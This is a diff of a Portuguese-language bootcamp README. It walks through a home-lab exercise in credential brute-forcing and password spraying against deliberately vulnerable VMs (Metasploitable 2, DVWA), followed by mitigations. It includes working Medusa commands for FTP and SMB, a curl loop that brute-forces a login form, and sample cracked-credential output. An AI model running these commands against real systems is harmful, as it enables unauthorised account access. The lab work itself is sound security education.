@@ -29,9 +29,9 @@ As máquinas-alvo (**Metasploitable 2** e **DVWA**) são sistemas **propositalme
 6. [Cenário 1 – Força Bruta em FTP](#-cenário-1--força-bruta-em-ftp-metasploitable-2)
 7. [Cenário 2 – Força Bruta em Formulário Web (DVWA)](#-cenário-2--força-bruta-em-formulário-web-dvwa)
 8. [Cenário 3 – Password Spraying em SMB](#-cenário-3--password-spraying-em-smb)
-9. [Validação dos Acessos](#-validação-dos-acessos)
-10. [Medidas de Mitigação](#-medidas-de-mitigação)
-11. [Conclusão e Aprendizados](#-conclusão-e-aprendizados)
+9. [Medidas de Mitigação](#-medidas-de-mitigação)
+10. [Dificuldades e Aprendizados](#-dificuldades-e-aprendizados)
+11. [Conclusão](#-conclusão)
 12. [Referências](#-referências)
 
 ---
@@ -59,7 +59,7 @@ Implementar, documentar e compartilhar um projeto prático utilizando **Kali Lin
 | **Credential stuffing** | Reutiliza pares usuário/senha vazados em outros serviços. |
 | **Password spraying** | Testa **poucas senhas comuns** contra **muitos usuários**, evitando o bloqueio por tentativas. |
 
-### Principais ferramentas de brute force no Kali Linux
+### Principais ferramentas no Kali Linux
 
 | Ferramenta | Foco principal |
 |---|---|
@@ -67,8 +67,7 @@ Implementar, documentar e compartilhar um projeto prático utilizando **Kali Lin
 | **Hydra** | Similar ao Medusa, altamente versátil |
 | **Ncrack** | Otimizada para auditoria de autenticação em rede |
 | **John the Ripper** | Quebra de *hashes* de senha offline |
-| **WPScan** | Enumeração e brute force específicos para WordPress |
-| **Patator** | Multiuso, altamente configurável |
+| **enum4linux / smbclient** | Enumeração e interação com serviços SMB |
 
 ---
 
@@ -80,207 +79,118 @@ Implementar, documentar e compartilhar um projeto prático utilizando **Kali Lin
 ┌────────────────────────┐        Rede Interna          ┌────────────────────────────┐
 │      KALI LINUX         │       (host-only)            │      METASPLOITABLE 2       │
 │      (Atacante)         │◄────────────────────────────►│      / DVWA (Alvo)          │
-│   IP: 192.168.56.10     │     192.168.56.0/24          │   IP: 192.168.56.20         │
+│   IP: 192.168.56.102    │     192.168.56.0/24          │   IP: 192.168.56.101        │
 └────────────────────────┘                              └────────────────────────────┘
 ```
 
-### Configuração (VirtualBox)
-
 | VM | Função | Rede |
 |---|---|---|
-| Kali Linux | Máquina atacante | Placa em **Rede Interna / Host-Only** |
-| Metasploitable 2 | Alvo vulnerável (FTP, SMB, serviços diversos) | Mesma rede interna |
+| Kali Linux | Máquina atacante | Host-only (`192.168.56.102`) |
+| Metasploitable 2 | Alvo vulnerável | Host-only (`192.168.56.101`) |
 
-> A rede **host-only** garante que o tráfego de ataque **nunca saia do seu computador**. Esse isolamento é o que torna o exercício ético e seguro.
+> A rede **host-only** garante que o tráfego de ataque **nunca saia da máquina física**. Esse isolamento é o que torna o exercício ético e seguro.
 
 ### Reconhecimento inicial (Nmap)
 
-Antes de qualquer ataque, mapeamos os serviços expostos no alvo:
-
 ```bash
-# Descobrir o IP do alvo na rede interna
-nmap -sn 192.168.56.0/24
-
-# Varredura de portas e serviços com detecção de versão
-nmap -sV -p- 192.168.56.20
+nmap -sV 192.168.56.101
 ```
 
-Saída esperada (resumida) no Metasploitable 2:
+O scan revelou diversos serviços vulneráveis expostos (FTP, SMB, MySQL, PostgreSQL, VNC, entre outros):
 
-```
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 2.3.4
-22/tcp   open  ssh         OpenSSH 4.7p1
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
-...
-```
+![Reconhecimento Nmap](images/nmap-scan.png)
 
 ---
 
 ## 🛠 Ferramentas Utilizadas
 
-- **Kali Linux** (máquina atacante)
-- **Medusa** (brute forcer principal)
-- **Nmap** (reconhecimento e enumeração)
-- **smbclient** / **enum4linux** (interação e enumeração SMB)
-- **DVWA** (alvo web vulnerável)
-- **VirtualBox** (virtualização)
-
-Verificando a instalação do Medusa:
-
-```bash
-medusa -h          # exibe a ajuda e os módulos disponíveis
-medusa -d          # lista todos os módulos de serviço suportados
-```
-
-Parâmetros essenciais do Medusa:
-
-| Flag | Significado |
-|---|---|
-| `-h` / `-H` | Host único / arquivo com lista de hosts |
-| `-u` / `-U` | Usuário único / arquivo com lista de usuários |
-| `-p` / `-P` | Senha única / arquivo de senhas (wordlist) |
-| `-M` | Módulo do serviço (ex.: `ftp`, `http`, `smbnt`) |
-| `-t` | Número de *threads* paralelas |
-| `-f` / `-F` | Para após a primeira credencial válida (no host / global) |
-| `-v` | Nível de verbosidade |
+- **VirtualBox** (virtualização) · **Kali Linux** (atacante) · **Metasploitable 2** (alvo)
+- **Medusa**, **Nmap**, **enum4linux**, **smbclient**, **curl**
+- **DVWA** (Damn Vulnerable Web Application)
 
 ---
 
 ## 📝 Criação das Wordlists
 
-Para os testes, criamos listas simples de usuários e senhas comuns.
-
-**`usuarios.txt`**
-```
-msfadmin
-admin
-root
-user
-service
-postgres
-```
-
-**`senhas.txt`**
-```
-msfadmin
-admin
-123456
-password
-root
-toor
-senha123
-```
-
-> Em cenários reais de auditoria, usam-se listas robustas como a **`rockyou.txt`** (já incluída no Kali em `/usr/share/wordlists/rockyou.txt.gz`). Gere wordlists personalizadas com ferramentas como **Crunch** ou **Cewl** quando precisar de termos específicos do alvo.
+Listas simples de usuários e senhas comuns, criadas direto no terminal:
 
 ```bash
-# Descompactar a rockyou (clássica no Kali)
-sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-
-# Exemplo com Crunch: senhas de 6 a 8 caracteres, dígitos
-crunch 6 8 0123456789 -o numeros.txt
+printf 'msfadmin\nadmin\nroot\nuser\n' > usuarios.txt
+printf 'msfadmin\nadmin\n123456\npassword\nroot\ntoor\n' > senhas.txt
 ```
+
+> Em auditorias reais usam-se listas robustas como a `rockyou.txt` (`/usr/share/wordlists/rockyou.txt.gz` no Kali) ou wordlists personalizadas geradas com **Crunch** / **Cewl**.
 
 ---
 
 ## 🎯 Cenário 1 – Força Bruta em FTP (Metasploitable 2)
 
-O serviço **vsftpd 2.3.4** do Metasploitable é um alvo clássico.
+Ataque ao serviço FTP com o Medusa:
 
 ```bash
-medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -v 4
+medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -v 4
 ```
 
-Interpretação do comando:
-- `-h` → alvo;
-- `-U` / `-P` → listas de usuários e senhas;
-- `-M ftp` → módulo FTP;
-- `-t 4` → 4 tentativas em paralelo;
-- `-f` → para ao achar a primeira credencial válida no host.
-
-**Evidência esperada:**
+**Resultado — credencial descoberta:**
 ```
-ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
 ```
 
-> 📸 *Inserir print em `/images/ftp-medusa.png`.*
+![Força bruta FTP](images/ftp-medusa.png)
 
 ---
 
 ## 🌐 Cenário 2 – Força Bruta em Formulário Web (DVWA)
 
-Formulários de login web exigem o módulo `http` do Medusa, informando o método, o caminho e a condição de falha.
+Alvo: formulário de login do DVWA (nível de segurança **Low**), que exige um cookie de sessão válido (`PHPSESSID`).
 
-Primeiro, no DVWA (nível de segurança **Low**), identifique:
-- O **caminho** do formulário (ex.: `/dvwa/vulnerabilities/brute/`);
-- Os **campos** enviados (`username`, `password`, `Login`);
-- A **mensagem de falha** (ex.: `Username and/or password incorrect`);
-- O **cookie de sessão** (`PHPSESSID`) e o token, se houver.
+![Página Brute Force do DVWA](images/dvwa-pagina.png)
+
+Para automatizar as tentativas, foi usado um **laço em `curl`**, enviando cada combinação com o cookie da sessão e detectando o sucesso pela mensagem de boas-vindas do DVWA:
 
 ```bash
-medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt \
-  -M http \
-  -m DIR:/dvwa/vulnerabilities/brute/index.php \
-  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-  -m DENY-SIGNAL:"Username and/or password incorrect" \
-  -t 2 -v 4
+COOKIE="PHPSESSID=<sua_sessao>; security=low"
+for p in msfadmin admin 123456 password root toor senha123; do
+  echo -n "Testando admin:$p -> "
+  curl -s -b "$COOKIE" "http://192.168.56.101/dvwa/vulnerabilities/brute/?username=admin&password=$p&Login=Login" \
+  | grep -q "Welcome to the password protected area" && echo ">>> SENHA CORRETA! <<<" || echo "falhou"
+done
 ```
 
-> Como alternativa muito comum para formulários web, o **Hydra** costuma ser mais direto:
-> ```bash
-> hydra -L usuarios.txt -P senhas.txt 192.168.56.20 \
->   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=SEU_COOKIE; security=low"
-> ```
+**Resultado — senha do `admin` encontrada:**
+```
+Testando admin:password -> >>> SENHA CORRETA! <<<
+```
 
-> 📸 *Inserir print em `/images/dvwa-bruteforce.png`.*
+![Força bruta DVWA](images/dvwa-bruteforce.png)
+
+> **Nota técnica:** a abordagem inicial foi com o **Hydra** (`http-get-form`), mas a versão testada apresentou um conflito de parsing ao escapar os dois-pontos (`:`) do cabeçalho `Cookie`. A solução com `curl` se mostrou mais transparente e confiável, deixando explícito o mecanismo HTTP por trás do ataque.
 
 ---
 
 ## 🏢 Cenário 3 – Password Spraying em SMB
 
-Simulação de um **cenário corporativo mal configurado**: muitos usuários, senhas fracas e padronizadas.
-
-### Passo 1 – Enumeração de usuários
+### Passo 1 – Enumeração de usuários e compartilhamentos
 ```bash
-# Enumeração SMB para descobrir usuários e compartilhamentos
-enum4linux -a 192.168.56.20
+enum4linux -a 192.168.56.101
+```
+A enumeração revelou o servidor **Samba 3.0.20-Debian**, o workgroup, usuários e os compartilhamentos disponíveis:
 
-# Alternativa com nmap
-nmap --script smb-enum-users -p 445 192.168.56.20
+![Enumeração SMB](images/smb-enum.png)
+
+### Passo 2 – Força bruta no SMB + validação do acesso
+```bash
+medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M smbnt -t 2 -v 4
+smbclient -L //192.168.56.101 -U msfadmin
 ```
 
-Com os usuários descobertos, montamos a lista `usuarios_smb.txt`.
-
-### Passo 2 – Password spraying com Medusa
-Em vez de muitas senhas por usuário (que dispara bloqueios), testamos **uma senha comum contra todos os usuários**:
-
-```bash
-medusa -h 192.168.56.20 -U usuarios_smb.txt -p "Senha@123" -M smbnt -t 1 -v 4
+**Resultado:**
 ```
-
-> Note o `-t 1` (sequencial) e uma única senha (`-p`): o objetivo é ser **discreto** e não travar as contas.
-
-> 📸 *Inserir print em `/images/smb-spraying.png`.*
-
----
-
-## ✅ Validação dos Acessos
-
-Após obter credenciais válidas, confirmamos o acesso real ao serviço SMB com o **smbclient**:
-
-```bash
-# Listar compartilhamentos disponíveis para o usuário
-smbclient -L //192.168.56.20 -U msfadmin
-
-# Conectar a um compartilhamento específico
-smbclient //192.168.56.20/tmp -U msfadmin
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
 ```
+O `smbclient` confirmou o acesso real, listando os compartilhamentos (`tmp`, `opt`, `IPC$`, `ADMIN$`, home do usuário):
 
-Dentro do `smbclient`, comandos como `ls`, `get` e `put` confirmam o nível de acesso obtido — evidência de que a credencial funciona de ponta a ponta.
-
-> 📸 *Inserir print em `/images/smbclient-acesso.png`.*
+![Ataque e acesso SMB](images/smb-ataque.png)
 
 ---
 
@@ -292,14 +202,13 @@ A parte mais importante de uma auditoria: **como se defender**.
 |---|---|
 | **Senhas fracas** | Política de senhas fortes (tamanho mínimo, complexidade, proibir senhas vazadas). |
 | **Tentativas ilimitadas** | **Account lockout** após N tentativas e **rate limiting** por IP. |
-| **Ausência de 2FO** | Implementar **autenticação multifator (MFA)**. |
-| **Serviços expostos** | Desabilitar serviços desnecessários; restringir por firewall e segmentação de rede. |
+| **Ausência de MFA** | Implementar **autenticação multifator**. |
+| **Serviços expostos** | Desabilitar serviços desnecessários; firewall e segmentação de rede. |
 | **FTP/SMB legados** | Substituir protocolos em texto claro por versões seguras (SFTP, SMBv3 com assinatura). |
 | **Falta de monitoramento** | **Fail2ban**, SIEM e alertas de múltiplas falhas de login. |
-| **Password spraying** | Monitorar falhas distribuídas entre muitos usuários (padrão típico do ataque). |
-| **Enumeração de usuários** | Mensagens de erro genéricas (não revelar se o usuário existe); restringir `null sessions` no SMB. |
+| **Enumeração de usuários** | Mensagens de erro genéricas; restringir *null sessions* no SMB. |
 
-Exemplo prático — protegendo o SSH com **Fail2ban**:
+Exemplo — protegendo o SSH com **Fail2ban**:
 ```bash
 sudo apt install fail2ban
 # Em /etc/fail2ban/jail.local: maxretry = 3, bantime = 1h
@@ -307,16 +216,22 @@ sudo apt install fail2ban
 
 ---
 
-## 🎓 Conclusão e Aprendizados
+## 🧗 Dificuldades e Aprendizados
 
-Este laboratório demonstrou, na prática, como **senhas fracas e serviços mal configurados** transformam um ambiente em alvo fácil. Principais lições:
+Registro honesto da minha jornada montando este laboratório:
 
-- Força bruta é eficaz **apenas** contra configurações negligentes — a defesa correta a neutraliza;
-- A fase de **reconhecimento e enumeração** (Nmap, enum4linux) é tão importante quanto o ataque em si;
-- **Password spraying** é perigoso justamente por burlar bloqueios de conta;
-- Documentar o processo e propor **mitigações** é o que diferencia um profissional de segurança de um simples "operador de ferramenta".
+- **Montar a rede host-only** foi onde entendi, na prática, o conceito de isolamento: as duas VMs só se enxergam entre si, e é isso que torna o teste seguro. Ver o primeiro `ping` entre Kali e Metasploitable respondendo foi o "clique" de que o ambiente estava de pé.
+- **O ataque ao DVWA me deu trabalho:** o Hydra travava no parsing do cookie de sessão. Em vez de insistir na ferramenta, resolvi com um laço em `curl` — e, no fim, aprendi mais, porque passei a enxergar exatamente a requisição HTTP que está por trás do ataque.
+- **Tirar os prints de dentro da VM** virou um aprendizado à parte: acabei configurando uma **pasta compartilhada** do VirtualBox para levar as evidências do Kali até o host.
+- A lição que fica: **a defesa é mais importante que o ataque**. Todos os acessos só foram possíveis por causa de senhas fracas e serviços mal configurados — exatamente o que as mitigações acima corrigem.
 
-> O valor do pentest não está em invadir, e sim em **entender o risco para então eliminá-lo**.
+> *(Seção pessoal — fique à vontade para reescrever com as suas próprias palavras.)*
+
+---
+
+## 🎓 Conclusão
+
+Este laboratório demonstrou, na prática, como **senhas fracas e serviços mal configurados** transformam um ambiente em alvo fácil, em três vetores diferentes (FTP, Web e SMB). Mais do que "invadir", o objetivo foi **entender o risco para então eliminá-lo** — que é o papel real de um profissional de segurança.
 
 ---
 
@@ -325,18 +240,15 @@ Este laboratório demonstrou, na prática, como **senhas fracas e serviços mal 
 ```
 .
 ├── README.md
-├── wordlists/
-│   ├── usuarios.txt
-│   ├── senhas.txt
-│   └── usuarios_smb.txt
-├── scripts/
-│   └── (scripts auxiliares, se houver)
+├── usuarios.txt
+├── senhas.txt
 └── images/
     ├── nmap-scan.png
     ├── ftp-medusa.png
+    ├── dvwa-pagina.png
     ├── dvwa-bruteforce.png
-    ├── smb-spraying.png
-    └── smbclient-acesso.png
+    ├── smb-enum.png
+    └── smb-ataque.png
 ```
 
 ---
@@ -344,14 +256,14 @@ Este laboratório demonstrou, na prática, como **senhas fracas e serviços mal 
 ## 🔗 Referências
 
 - [Kali Linux – Site Oficial](https://www.kali.org/)
-- [Medusa – Documentação](https://github.com/jmk-foofus/medusa)
-- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
-- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
-- [Metasploitable 2 – Documentação](https://docs.rapid7.com/metasploit/metasploitable-2/)
+- [Medusa – Documentação](http://www.foofus.net/jmk/medusa/medusa.html)
+- [DVWA – Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
+- [Nmap – Manual Oficial](https://nmap.org/book/)
+- [Metasploitable 2 – Documentação (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
 
 ---
 
 <p align="center">
-  Desenvolvido como parte do Bootcamp <strong>Santander – Cibersegurança do Zero à Prática</strong> 🚀<br>
+  Projeto desenvolvido no Bootcamp <strong>Santander – Cibersegurança do Zero à Prática</strong> 🚀<br>
   <em>Digital Innovation One (DIO)</em>
 </p>
